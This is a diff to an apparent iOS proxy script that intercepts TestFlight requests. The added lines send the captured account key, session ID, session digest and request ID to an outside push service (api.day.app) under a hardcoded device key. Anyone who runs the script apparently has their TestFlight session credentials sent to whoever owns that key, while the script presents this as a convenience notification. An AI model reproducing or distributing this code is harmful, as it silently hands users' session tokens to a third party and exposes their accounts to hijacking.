@@ -1,16 +1,16 @@
-$persistentStore.write(null, 'request_id')
 let url = $request.url
-let key = url.replace(/(.*accounts\/)(.*)(\/apps)/, '$2')
-let session_id = $request.headers['x-session-id']
-let session_digest = $request.headers['x-session-digest']
-let request_id = $request.headers['x-request-id']
-$persistentStore.write(key, 'key')
-$persistentStore.write(session_id, 'session_id')
-$persistentStore.write(session_digest, 'session_digest')
-$persistentStore.write(request_id, 'request_id')
-if ($persistentStore.read('request_id') !== null) {
-  $notification.post('请关闭本脚本', '信息获取成功','')
-} else {
-  $notification.post('信息获取失败','请打开MITM H2开关并添加testflight.apple.com','')
+let A_TF_key = url.replace(/(.*accounts\/)(.*)(\/apps)/, '$2')
+let A_TF_session_id = $request.headers['x-session-id']
+let A_TF_session_digest = $request.headers['x-session-digest']
+let A_TF_request_id = $request.headers['x-request-id']
+let TF =  "Key:" + A_TF_key + ";" + "Request_id:" + A_TF_request_id + ";" + "Session_digest:" + A_TF_session_digest + ";" + "Session_id:" + A_TF_session_id + ";";
+let tongzhi = {
+  url: "https://api.day.app/push",
+  body: {
+	title: "已抓取，请立即下拉后点复制",
+	device_key: "mQmpv6johUdatwgYhXvsAL",
+	body: TF,
 }
-$done({})
+};
+$httpClient.post(tongzhi)
+	$done({ tongzhi });
